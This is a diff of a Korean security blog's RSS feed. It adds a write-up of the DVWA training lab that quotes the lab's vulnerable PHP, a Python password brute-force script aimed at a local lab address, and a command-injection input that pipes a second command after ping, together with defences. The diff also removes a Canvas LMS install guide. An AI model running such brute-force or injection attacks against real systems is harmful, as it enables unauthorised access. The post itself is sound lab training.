@@ -9,8 +9,40 @@
     <atom:link href="https://blog.jhyeon.dev/rss2.xml" rel="self" type="application/rss+xml"/>
     
     <description>정동현(JHYEON BLOG)</description>
-    <pubDate>Sun, 17 Jan 2021 15:00:00 GMT</pubDate>
+    <pubDate>Mon, 18 Jan 2021 15:00:00 GMT</pubDate>
     <generator>http://hexo.io/</generator>
+    
+    <item>
+      <title>DVWA 웹 취약점 모의 훈련 도구 리뷰</title>
+      <link>https://blog.jhyeon.dev/2021/01/19/dvwa-review-210119/</link>
+      <guid>https://blog.jhyeon.dev/2021/01/19/dvwa-review-210119/</guid>
+      <pubDate>Mon, 18 Jan 2021 15:00:00 GMT</pubDate>
+      
+        
+        
+      <description>&lt;h3 id=&quot;Intro&quot;&gt;&lt;a href=&quot;#Intro&quot; class=&quot;headerlink&quot; title=&quot;Intro&quot;&gt;&lt;/a&gt;Intro&lt;/h3&gt;&lt;p&gt;DVWA는 웹 취약점 모의 해킹(훈련) 도구이며 다운로드는 아래 링크에서 가능합니다.&lt;/p&gt;
+&lt;ul&gt;
+&lt;</description>
+        
+      
+      
+      
+      <content:encoded><![CDATA[<h3 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h3><p>DVWA는 웹 취약점 모의 해킹(훈련) 도구이며 다운로드는 아래 링크에서 가능합니다.</p><ul><li><p><a href="http://www.dvwa.co.uk/">http://www.dvwa.co.uk</a></p></li><li><p>해당 포스트에서는 초심자인 easy 난이도와 대응 방안에 대해서만 작성합니다.</p></li><li><p>기능 별 순차적으로 업데이트 할 예정입니다!</p></li></ul><h2 id="Category"><a href="#Category" class="headerlink" title="Category"></a>Category</h2><h3 id="Brute-Force"><a href="#Brute-Force" class="headerlink" title="Brute Force"></a>Brute Force</h3><p>해당 문제는 제목 답게 “Brute Force(무차별 대입 공격)” 기법을 사용하는 문제이다.</p><img src="/img/post/dvwa/bruteforce.png" class="lazyload" data-srcset="/img/post/dvwa/bruteforce.png" srcset="data:image/png;base64,666"><p>그냥 평범하게 로그인 창이 있는데, 공격 벡터는 두군데 밖에 없다. (아이디 / 패스워드 입력폼)</p><p>사용자로부터 입력을 받는 폼에서 이제 무차별 대입 공격 기법을 시도하여 계정을 알아내는 방식이다.</p><pre><code class="php">&lt;?php if( isset( $_GET[ &#39;Login&#39; ] ) ) &#123;     // Get username     $user = $_GET[ &#39;username&#39; ];     // Get password     $pass = $_GET[ &#39;password&#39; ];     $pass = md5( $pass );     // Check the database     $query  = &quot;SELECT * FROM `users` WHERE user = &#39;$user&#39; AND password = &#39;$pass&#39;;&quot;;     $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );    if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) &#123;         // Get users details         $row    = mysqli_fetch_assoc( $result );         $avatar = $row[&quot;avatar&quot;];         // Login successful         echo &quot;&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;&quot;;         echo &quot;&lt;img src=\&quot;&#123;$avatar&#125;\&quot; /&gt;&quot;;     &#125;     else &#123;         // Login failed         echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;;     &#125;     ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); &#125; ?&gt; </code></pre><p>로직은 매우 간단하다. POST 방식으로 넘어온 username, password 값을 받아서 각각 $user, $pass 변수에 저장한다.</p><pre><code class="php">    // Check the database     $query  = &quot;SELECT * FROM `users` WHERE user = &#39;$user&#39; AND password = &#39;$pass&#39;;&quot;;     $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );</code></pre><p>이후 넘어온 $user(username) 값과 $pass(password) 값을 users 테이블과 매칭해 데이터가 있는지 조회하는 쿼리문을 작성했다.</p><p>일치하는 정보가 있으면 login successful 로 넘어갈 것이고, 없거나 하나라도 틀린정보가 있다면 login failed 로직쪽으로 넘어갈 것이다.</p><p>해당 단계는 아래 python 코드를 사용하여 풀이할 수 있다.</p><pre><code class="py">#!/usr/bin/python3import requestsfrom time import sleepurl = &quot;http://192.168.25.60:4731/vulnerabilities/brute/&quot;session = &#123;&quot;PHPSESSID&quot;:&quot;sessionid&quot;,&quot;security&quot;:&quot;low&quot;&#125;with open(&#39;password.txt&#39;) as f:    while True:        line = f.readline().splitlines()        param = &#123;&quot;username&quot;:&quot;admin&quot;, &quot;password&quot;:line, &quot;Login&quot;:&quot;Login&quot;&#125;        r = requests.get(url, params=param, cookies=session)        sleep(1)        if(&quot;Welcome to the password protected area admin&quot; in r.text):            print(&quot;password matching!!&quot;,line)        else:            print(&quot;not match&quot;)        if not line:            break</code></pre><p>코드에 사용된 “password.txt”는 github에 검색좀 해보면 나오는 리스트들이다.</p><p>이러한 비밀번호 리스트들을 사용해서 한줄씩 대입을 하여 로그인이 됐을 때의 상태 / 실패했을 때의 상태를 체크해서</p><p>문제를 풀어주면 된다.</p><hr><h3 id="Brute-Force-대응-방안"><a href="#Brute-Force-대응-방안" class="headerlink" title="Brute Force (대응 방안)"></a>Brute Force (대응 방안)</h3><p>무차별 대입 공격을 막는 방법은 여러가지가 있을 수 있지만</p><p>자동화 도구나 봇을 통해 작업을 하는 것을 차단할 수 있는 “google recapture”를 적용하면 된다.</p><p>또한 연속적으로 시도하지 못하도록 “최대 시도 횟수 제한” 기능을 넣는다면 이런 공격으로부터 방어를 할 수 있지 않나 싶다.</p><h3 id="Command-Injection"><a href="#Command-Injection" class="headerlink" title="Command Injection"></a>Command Injection</h3><p>커맨드 인젝션(Cmd Injection) 공격은 웹 앱에서 시스템 명령을 사용할 때 적절한 필터링 조치가 되어 있지 않은 경우</p><p>하나의 커맨드안에서 두개의 명령을 실행 해 공격자가 원하는 결과를 얻어낼 수 있는 공격입니다.</p><pre><code class="php">&lt;?phpif( isset( $_POST[ &#39;Submit&#39; ]  ) ) &#123;    // Get input    $target = $_REQUEST[ &#39;ip&#39; ];    // Determine OS and execute the ping command.    if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) &#123;        // Windows        $cmd = shell_exec( &#39;ping  &#39; . $target );    &#125;    else &#123;        // *nix        $cmd = shell_exec( &#39;ping  -c 4 &#39; . $target );    &#125;    // Feedback for the end user    echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;;&#125;?&gt;</code></pre><p>우선 코드를 분석해보면 REQUEST로 사용자로 부터 ip값을 입력받아 $target 변수에 저장하고,</p><p>하단의 shell_exec 시스템 함수로 ping 명령을 수행합니다.</p><p>ex) shell_exec(ping 127.0.0.1)</p><p>ex) shell_exec(ping -c 4 127.0.0.1)</p><p>넘어온 ip를 대입해서 함수를 맞춰보면 이런 구조가 되겠죠.</p><p>다만, 아래와 같이 사용할 경우 커맨드 인젝션이 발생하게 됩니다.</p><pre><code class="bash">ping -c 4 127.0.0.1 | pwd</code></pre><p>127.0.0.1로 핑을 보내는 동시에 뒤에 |(파이프라인)으로 처리된 pwd 명령까지 함께 실행하게 됩니다.</p><p>즉 하나의 커맨드안에서 두개의 명령을 실행하는 것이 가능하다는 의미이죠.</p><p>실무에서는 잘 없겠지만 매~~우매우 취약한 사이트에 이런 기능이 있다고 하면</p><p>공격자가 RCE 환경을 만들어버릴 수 있는 취약점입니다.</p><h3 id="Command-Injection-대응-방안"><a href="#Command-Injection-대응-방안" class="headerlink" title="### Command Injection(대응 방안)"></a>### Command Injection(대응 방안)</h3><p>제가 생각하기엔, 실무나 회사에서 과연 이런 시스템 함수를 써서 뭔가의 기능을 사용할 일이 있나 싶습니다.</p><p>그러나, 다방면으로 쓰는 분들이 있을 수 있기에 간단한 대응 방안을 나열해봅시다.</p><ol><li><p>특수문자 필터링</p></li><li><p>입력값 regex 정규식 표현 사용</p></li><li><p>화이트 리스트 기반 명령어 실행 (사용할 수 있는 명령어 제한)</p></li></ol><p>뭐 이정도가 될 수 있겠네요 ㅎㅎ..</p>]]></content:encoded>
+      
+      
+      <category domain="https://blog.jhyeon.dev/categories/Web/">Web</category>
+      
+      
+      <category domain="https://blog.jhyeon.dev/tags/Web/">Web</category>
+      
+      <category domain="https://blog.jhyeon.dev/tags/DVWA/">DVWA</category>
+      
+      <category domain="https://blog.jhyeon.dev/tags/Pentesting/">Pentesting</category>
+      
+      
+      <comments>https://blog.jhyeon.dev/2021/01/19/dvwa-review-210119/#disqus_thread</comments>
+      
+    </item>
     
     <item>
       <title>Mac Big Sur 사용 후기 및 백업의 중요성..</title>
@@ -189,6 +221,35 @@
     </item>
     
     <item>
+      <title>웹 해킹 기법 기초</title>
+      <link>https://blog.jhyeon.dev/2021/01/01/webhacking-210101/</link>
+      <guid>https://blog.jhyeon.dev/2021/01/01/webhacking-210101/</guid>
+      <pubDate>Thu, 31 Dec 2020 15:00:00 GMT</pubDate>
+      
+        
+        
+      <description>&lt;p&gt;해당 포스트는 노션으로 이전되었습니다.&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;https://www.notion.so/jhyeon/Web-Hacking-Basic-1b7c7cb3dfe44feeae9e48dc17486ff0&quot;&gt;https://www.notion</description>
+        
+      
+      
+      
+      <content:encoded><![CDATA[<p>해당 포스트는 노션으로 이전되었습니다.</p><p><a href="https://www.notion.so/jhyeon/Web-Hacking-Basic-1b7c7cb3dfe44feeae9e48dc17486ff0">https://www.notion.so/jhyeon/Web-Hacking-Basic-1b7c7cb3dfe44feeae9e48dc17486ff0</a></p>]]></content:encoded>
+      
+      
+      <category domain="https://blog.jhyeon.dev/categories/Docx/">Docx</category>
+      
+      
+      <category domain="https://blog.jhyeon.dev/tags/Web/">Web</category>
+      
+      <category domain="https://blog.jhyeon.dev/tags/Web-Hacking/">Web Hacking</category>
+      
+      
+      <comments>https://blog.jhyeon.dev/2021/01/01/webhacking-210101/#disqus_thread</comments>
+      
+    </item>
+    
+    <item>
       <title>시스템 OS 개념 및 기초</title>
       <link>https://blog.jhyeon.dev/2021/01/01/systemos-210101/</link>
       <guid>https://blog.jhyeon.dev/2021/01/01/systemos-210101/</guid>
@@ -220,35 +281,6 @@
     </item>
     
     <item>
-      <title>웹 해킹 기법 기초</title>
-      <link>https://blog.jhyeon.dev/2021/01/01/webhacking-210101/</link>
-      <guid>https://blog.jhyeon.dev/2021/01/01/webhacking-210101/</guid>
-      <pubDate>Thu, 31 Dec 2020 15:00:00 GMT</pubDate>
-      
-        
-        
-      <description>&lt;p&gt;해당 포스트는 노션으로 이전되었습니다.&lt;/p&gt;
-&lt;p&gt;&lt;a href=&quot;https://www.notion.so/jhyeon/Web-Hacking-Basic-1b7c7cb3dfe44feeae9e48dc17486ff0&quot;&gt;https://www.notion</description>
-        
-      
-      
-      
-      <content:encoded><![CDATA[<p>해당 포스트는 노션으로 이전되었습니다.</p><p><a href="https://www.notion.so/jhyeon/Web-Hacking-Basic-1b7c7cb3dfe44feeae9e48dc17486ff0">https://www.notion.so/jhyeon/Web-Hacking-Basic-1b7c7cb3dfe44feeae9e48dc17486ff0</a></p>]]></content:encoded>
-      
-      
-      <category domain="https://blog.jhyeon.dev/categories/Docx/">Docx</category>
-      
-      
-      <category domain="https://blog.jhyeon.dev/tags/Web/">Web</category>
-      
-      <category domain="https://blog.jhyeon.dev/tags/Web-Hacking/">Web Hacking</category>
-      
-      
-      <comments>https://blog.jhyeon.dev/2021/01/01/webhacking-210101/#disqus_thread</comments>
-      
-    </item>
-    
-    <item>
       <title>ChristmasCTF 2019 Write up</title>
       <link>https://blog.jhyeon.dev/2020/12/26/christmasctf-201226/</link>
       <guid>https://blog.jhyeon.dev/2020/12/26/christmasctf-201226/</guid>
@@ -267,9 +299,9 @@
       <category domain="https://blog.jhyeon.dev/categories/CTF/">CTF</category>
       
       
-      <category domain="https://blog.jhyeon.dev/tags/Web/">Web</category>
-      
       <category domain="https://blog.jhyeon.dev/tags/Pwnable/">Pwnable</category>
+      
+      <category domain="https://blog.jhyeon.dev/tags/Web/">Web</category>
       
       <category domain="https://blog.jhyeon.dev/tags/ChristmasCTF2019/">ChristmasCTF2019</category>
       
@@ -320,12 +352,12 @@
         
       <description>&lt;p&gt;POX 2020 출제자 Write up 자료입니다.&lt;/p&gt;
 &lt;p&gt;아래 노션에서 풀이를 확인하실 수 있습니다.&lt;/p&gt;
-&lt;p&gt;질문 사항이 있으시면 &lt;a href=&quot;mailto:&amp;#x73;&amp;#x74;&amp;#106;&amp;#x68;&amp;#x79;&amp;#101;&amp;#x6f</description>
+&lt;p&gt;질문 사항이 있으시면 &lt;a href=&quot;mailto:&amp;#x73;&amp;#116;&amp;#x6a;&amp;#104;&amp;#121;&amp;#x65;&amp;#111</description>
         
       
       
       
-      <content:encoded><![CDATA[<p>POX 2020 출제자 Write up 자료입니다.</p><p>아래 노션에서 풀이를 확인하실 수 있습니다.</p><p>질문 사항이 있으시면 <a href="mailto:&#x73;&#x74;&#106;&#x68;&#x79;&#101;&#x6f;&#110;&#x40;&#107;&#97;&#x6b;&#97;&#x6f;&#46;&#99;&#x6f;&#109;">&#x73;&#x74;&#106;&#x68;&#x79;&#101;&#x6f;&#110;&#x40;&#107;&#97;&#x6b;&#97;&#x6f;&#46;&#99;&#x6f;&#109;</a> 으로 메일을 보내주세요!</p><p><a href="https://www.notion.so/jhyeon/POX-2020-Write-Up-300e65d33b6c4dd185d886cd2e7a6417">https://www.notion.so/jhyeon/POX-2020-Write-Up-300e65d33b6c4dd185d886cd2e7a6417</a></p>]]></content:encoded>
+      <content:encoded><![CDATA[<p>POX 2020 출제자 Write up 자료입니다.</p><p>아래 노션에서 풀이를 확인하실 수 있습니다.</p><p>질문 사항이 있으시면 <a href="mailto:&#x73;&#116;&#x6a;&#104;&#121;&#x65;&#111;&#x6e;&#64;&#107;&#97;&#x6b;&#x61;&#111;&#46;&#x63;&#x6f;&#x6d;">&#x73;&#116;&#x6a;&#104;&#121;&#x65;&#111;&#x6e;&#64;&#107;&#97;&#x6b;&#x61;&#111;&#46;&#x63;&#x6f;&#x6d;</a> 으로 메일을 보내주세요!</p><p><a href="https://www.notion.so/jhyeon/POX-2020-Write-Up-300e65d33b6c4dd185d886cd2e7a6417">https://www.notion.so/jhyeon/POX-2020-Write-Up-300e65d33b6c4dd185d886cd2e7a6417</a></p>]]></content:encoded>
       
       
       <category domain="https://blog.jhyeon.dev/categories/CTF/">CTF</category>
@@ -479,9 +511,9 @@
       <category domain="https://blog.jhyeon.dev/categories/CTF/">CTF</category>
       
       
-      <category domain="https://blog.jhyeon.dev/tags/Web/">Web</category>
-      
       <category domain="https://blog.jhyeon.dev/tags/Pwnable/">Pwnable</category>
+      
+      <category domain="https://blog.jhyeon.dev/tags/Web/">Web</category>
       
       <category domain="https://blog.jhyeon.dev/tags/PicoCTF2019/">PicoCTF2019</category>
       
@@ -574,34 +606,6 @@
       
       
       <comments>https://blog.jhyeon.dev/2020/08/18/sstf-200818/#disqus_thread</comments>
-      
-    </item>
-    
-    <item>
-      <title>canvas lms installation</title>
-      <link>https://blog.jhyeon.dev/2020/06/27/canvas-install-200627/</link>
-      <guid>https://blog.jhyeon.dev/2020/06/27/canvas-install-200627/</guid>
-      <pubDate>Fri, 26 Jun 2020 15:00:00 GMT</pubDate>
-      
-        
-        
-      <description>&lt;h3 id=&quot;OS&quot;&gt;&lt;a href=&quot;#OS&quot; class=&quot;headerlink&quot; title=&quot;OS&quot;&gt;&lt;/a&gt;OS&lt;/h3&gt;&lt;p&gt;OS : Ubuntu 16.04 Desktop(&lt;a href=&quot;http://old-releases.ubuntu.com/rele</description>
-        
-      
-      
-      
-      <content:encoded><![CDATA[<h3 id="OS"><a href="#OS" class="headerlink" title="OS"></a>OS</h3><p>OS : Ubuntu 16.04 Desktop(<a href="http://old-releases.ubuntu.com/releases/16.04.4/">http://old-releases.ubuntu.com/releases/16.04.4/</a>)</p><p>Canvas LMS - Open Source : <a href="https://github.com/instructure/canvas-lms">https://github.com/instructure/canvas-lms</a></p><h2 id="설치"><a href="#설치" class="headerlink" title="설치"></a>설치</h2><h3 id="postgresql-설치"><a href="#postgresql-설치" class="headerlink" title="postgresql 설치"></a>postgresql 설치</h3><pre><code class="bash">$ sudo apt-get install postgresql-9.5</code></pre><hr><h3 id="관리자-계정-생성"><a href="#관리자-계정-생성" class="headerlink" title="관리자 계정 생성"></a>관리자 계정 생성</h3><pre><code class="bash">adduser sysadmin</code></pre><hr><h3 id="sysadmin-계정에-대한-Root-권한-부여"><a href="#sysadmin-계정에-대한-Root-권한-부여" class="headerlink" title="sysadmin 계정에 대한 Root 권한 부여"></a>sysadmin 계정에 대한 Root 권한 부여</h3><pre><code class="bash">visudo → User Privileges → sysadmin ALL=(ALL:ALL) ALL</code></pre><hr><h3 id="sysadmin-계정으로-사용자-변경"><a href="#sysadmin-계정으로-사용자-변경" class="headerlink" title="sysadmin 계정으로 사용자 변경"></a>sysadmin 계정으로 사용자 변경</h3><pre><code class="bash">su sysadmin</code></pre><hr><h3 id="postgres-설정"><a href="#postgres-설정" class="headerlink" title="postgres 설정"></a>postgres 설정</h3><pre><code class="bash">sudo -u postgres createuser canvas --no-createdb \   --no-superuser --no-createrole --pwpromptsudo -u postgres createdb canvas_production --owner=canvas</code></pre><hr><h3 id="git-설정"><a href="#git-설정" class="headerlink" title="git 설정"></a>git 설정</h3><pre><code class="bash">sudo apt-get install git-coregit clone https://github.com/instructure/canvas-lms.git canvascd canvasgit checkout stable</code></pre><hr><h3 id="installation-1"><a href="#installation-1" class="headerlink" title="installation(1)"></a>installation(1)</h3><pre><code class="bash">sudo mkdir -p /var/canvassudo chown -R sysadmin /var/canvas$(canvas) cp -av . /var/canvas</code></pre><hr><h3 id="Dependency"><a href="#Dependency" class="headerlink" title="Dependency"></a>Dependency</h3><pre><code class="bash">sudo apt-get install software-properties-commonsudo add-apt-repository ppa:brightbox/ruby-ngsudo apt-get update</code></pre><hr><h3 id="ruby2-4-install"><a href="#ruby2-4-install" class="headerlink" title="ruby2.4 install"></a>ruby2.4 install</h3><pre><code class="bash">sudo apt-get install ruby2.4 ruby2.4-dev zlib1g-dev libxml2-dev \                       libsqlite3-dev postgresql libpq-dev \                       libxmlsec1-dev curl make g++</code></pre><hr><h3 id="node-js-install"><a href="#node-js-install" class="headerlink" title="node.js install"></a>node.js install</h3><pre><code class="bash">curl -sL https://deb.nodesource.com/setup_10.x | sudo -E bash -sudo apt-get install nodejs</code></pre><hr><h3 id="set-sysadmin-postgres-superuser"><a href="#set-sysadmin-postgres-superuser" class="headerlink" title="set sysadmin postgres superuser"></a>set sysadmin postgres superuser</h3><pre><code class="bash">$ sudo -u postgres createuser $USER$ sudo -u postgres psql -c &quot;alter user $USER with superuser&quot; postgres</code></pre><hr><h3 id="bundler-and-canvas-dependencies"><a href="#bundler-and-canvas-dependencies" class="headerlink" title="bundler and canvas dependencies"></a>bundler and canvas dependencies</h3><pre><code class="bash">$ sudo gem install bundler --version 1.13.7$ bundle _1.13.7_ install --path vendor/bundle</code></pre><hr><h3 id="yarn-installation"><a href="#yarn-installation" class="headerlink" title="yarn installation"></a>yarn installation</h3><pre><code class="bash">$ curl -sS https://dl.yarnpkg.com/debian/pubkey.gpg | sudo apt-key add -$ echo &quot;deb https://dl.yarnpkg.com/debian/ stable main&quot; | sudo tee /etc/apt/sources.list.d/yarn.list$ sudo apt-get update &amp;&amp; sudo apt-get install yarn=1.10.1-1$ sudo apt-get install python$ yarn install</code></pre><hr><h3 id="canvas-default-config"><a href="#canvas-default-config" class="headerlink" title="canvas default config"></a>canvas default config</h3><pre><code class="bash">$ for config in amazon_s3 database \  delayed_jobs domain file_store outgoing_mail security external_migration; \  do cp config/$config.yml.example config/$config.yml; done</code></pre><hr><h3 id="dynamic-setting"><a href="#dynamic-setting" class="headerlink" title="dynamic setting"></a>dynamic setting</h3><pre><code class="bash">$ cp config/dynamic_settings.yml.example config/dynamic_settings.yml$ (check) nano config/dynamic_settings.yml (vi로 진행해도 상관 없음)</code></pre><hr><h3 id="database-setting"><a href="#database-setting" class="headerlink" title="database setting"></a>database setting</h3><pre><code class="bash">$ cp config/database.yml.example config/database.yml$ (check) nano config/database.yml (vi로 진행해도 상관 없음)# do not create a queue: section for your test environmenttest:  adapter: postgresql  encoding: utf8  database: canvas_test  host: localhost  username: canvas  timeout: 5000development:  adapter: postgresql  encoding: utf8  database: canvas_development  timeout: 5000production:  adapter: postgresql  encoding: utf8  database: canvas_production  host: localhost  username: canvas  password: your_password  timeout: 5000</code></pre><hr><h3 id="outgoing-mail-config"><a href="#outgoing-mail-config" class="headerlink" title="outgoing mail config"></a>outgoing mail config</h3><pre><code class="bash">$ cp config/outgoing_mail.yml.example config/outgoing_mail.yml$ (check) nano config/outgoing_mail.yml (vi로 진행해도 상관 없음)</code></pre><hr><h3 id="url-config"><a href="#url-config" class="headerlink" title="url config"></a>url config</h3><pre><code class="bash">$ cp config/domain.yml.example config/domain.yml$ (check) nano config/domain.yml (vi로 진행해도 상관 없음)production:  domain: &quot;canvas.jhyeon.xyz&quot;  # whether this instance of canvas is served over ssl (https) or not  # defaults to true for production, false for test/development  ssl: false  # files_domain: &quot;canvasfiles.example.com&quot;</code></pre><hr><h3 id="security-config"><a href="#security-config" class="headerlink" title="security config"></a>security config</h3><pre><code class="bash">$ cp config/security.yml.example config/security.yml$ nano config/security.yml (vi로 진행해도 상관 없음)production: &amp;default  # replace this with a random string of at least 20 characters  encryption_key: 12345123451234512345  lti_iss: &#39;https://canvas.instructure.com&#39;</code></pre><hr><h3 id="generate-assets"><a href="#generate-assets" class="headerlink" title="generate assets"></a>generate assets</h3><pre><code class="bash">$ (/var/canvas) mkdir -p log tmp/pids public/assets app/stylesheets/brandable_css_brands$ (/var/canvas) touch app/stylesheets/_brandable_variables_defaults_autogenerated.scss$ (/var/canvas) touch Gemfile.lock$ (/var/canvas) touch log/production.log$ (/var/canvas) sudo adduser --disabled-password --gecos canvas canvasuser$ (/var/canvas) sudo chown -R canvasuser config/environment.rb log tmp public/assets \                              app/stylesheets/_brandable_variables_defaults_autogenerated.scss \                              app/stylesheets/brandable_css_brands Gemfile.lock config.ru$ (/var/canvas) yarn install$ (/var/canvas) RAILS_ENV=production bundle exec rake canvas:compile_assets$ (/var/canvas) sudo chown -R canvasuser public/dist/brandable_css$ (/var/canvas) RAILS_ENV=production bundle exec rake brand_configs:generate_and_upload_all* VM 메모리 최소 8GB 메모리 구성 필요합니다.</code></pre><hr><h3 id="database-population"><a href="#database-population" class="headerlink" title="database population"></a>database population</h3><pre><code class="bash">RAILS_ENV=production bundle exec rake db:initial_setup</code></pre><hr><h3 id="apache2-installation"><a href="#apache2-installation" class="headerlink" title="apache2 installation"></a>apache2 installation</h3><pre><code class="bash">$ sudo apt-get install passenger libapache2-mod-passenger apache2$ sudo a2enmod rewrite$ sudo a2enmod passenger$ sudo a2enmod ssl$ sudo unlink /etc/apache2/sites-enabled/000-default.conf아래 단계 완료 후 수행$ sudo a2ensite canvas</code></pre><pre><code class="bash">&lt;VirtualHost *:80&gt;  ServerName canvas.jhyeon.xyz  ServerAlias canvasfiles.canvas.jhyeon.xyz  ServerAdmin admin@canvas.jhyeon.xyz  DocumentRoot /var/canvas/public  ErrorLog /var/log/apache2/canvas_errors.log  LogLevel warn  CustomLog /var/log/apache2/canvas_access.log combined  SetEnv RAILS_ENV production  &lt;Directory /var/canvas/public&gt;    Options All    AllowOverride All    Require all granted    Options -MultiViews  &lt;/Directory&gt;&lt;/VirtualHost&gt;</code></pre><hr><h3 id="cache-config"><a href="#cache-config" class="headerlink" title="cache config"></a>cache config</h3><pre><code class="bash">$ sudo add-apt-repository ppa:chris-lea/redis-server$ sudo apt-get update$ sudo apt-get install redis-server$ sudo cp config/cache_store.yml.example config/cache_store.yml$ sudo vi config/cache_store.ymltest:  cache_store: redis_storedevelopment:  cache_store: redis_storeproduction:  cache_store: redis_store$ sudo chown canvasuser config/cache_store.yml$ sudo cp config/redis.yml.example config/redis.yml$ sudo vi config/redis.ymlproduction:  servers:    - redis://localhost$ sudo chown canvasuser config/redis.yml</code></pre><hr><h3 id="start-server"><a href="#start-server" class="headerlink" title="start server"></a>start server</h3><pre><code class="bash">$ sudo ln -s /var/canvas/script/canvas_init /etc/init.d/canvas_init$ sudo update-rc.d canvas_init defaults$ sudo /etc/init.d/canvas_init start$ sudo /etc/init.d/apache2 restart</code></pre><hr><h3 id="참고"><a href="#참고" class="headerlink" title="참고"></a>참고</h3><ul><li><p><a href="https://github.com/instructure/canvas-lms/wiki/Production-Start">https://github.com/instructure/canvas-lms/wiki/Production-Start</a></p></li><li><p><a href="https://www.notion.so/jhyeon/Canvas-LMS-Install-bdbe60b1a7bd40029a5f241ed77a9d49">https://www.notion.so/jhyeon/Canvas-LMS-Install-bdbe60b1a7bd40029a5f241ed77a9d49</a></p></li></ul>]]></content:encoded>
-      
-      
-      <category domain="https://blog.jhyeon.dev/categories/Docx/">Docx</category>
-      
-      
-      <category domain="https://blog.jhyeon.dev/tags/CANVAS/">CANVAS</category>
-      
-      <category domain="https://blog.jhyeon.dev/tags/LMS/">LMS</category>
-      
-      
-      <comments>https://blog.jhyeon.dev/2020/06/27/canvas-install-200627/#disqus_thread</comments>
       
     </item>
     
